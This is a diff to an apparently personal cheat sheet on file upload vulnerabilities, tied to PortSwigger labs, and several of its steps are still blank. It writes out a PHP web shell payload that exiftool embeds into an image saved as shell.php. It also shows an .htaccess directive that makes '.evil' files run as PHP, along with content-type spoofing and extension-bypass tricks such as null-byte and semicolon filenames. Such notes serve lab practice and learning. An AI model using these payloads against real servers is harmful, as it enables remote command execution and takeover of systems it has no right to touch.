@@ -1,9 +1,16 @@
 #### Overriding the Server Confiugration
 
 ```
-#Upload a custom .htaccess file. (https://br4ind3ad.medium.com/port-swigger-file-upload-vulnerability-lab-4-4c2bf39eeaf)
-#This means all files with the extension evil with execute as PHP.
-AddType application/x-httpd-php .evil
+#Apache
+1. Create a custom .htaccess file. (https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)
+2. Upload it.
+3. Upload your new shell.
+
+#IIS
+1. Create a custom web.config file.
+2.
+3.
+
 ```
 
 #### Flawed File Type Validation
@@ -12,14 +19,28 @@ AddType application/x-httpd-php .evil
 1. Create your malicious file.
 2. Upload and intercept the request.
 3. Change the content-type header to match what the application is expecting.
-4. Browse to y
+4. Browse to your file, is it executed?
+
+#Is it validating by extension?
+1.
+2.
+3.
+4.
+
+#Is it scanning the content?
+exiftool -Comment="<?php system($_GET['cmd']); ?>" <YOUR-INPUT-IMAGE>.jpg -o shell.php
 ```
 
 #### Insufficient Blacklisting of Dangerous File Types 
 
 ```
 #Modify the original extension
-eg. phps, pHp, php7, phtml.
+PHP: phps, pHp, php7, phtml.
+
+#Obfuscate the extension
+1. shell.asp;.jpg
+2. shell.asp%00.jpg
+3. 
 ```
 
 
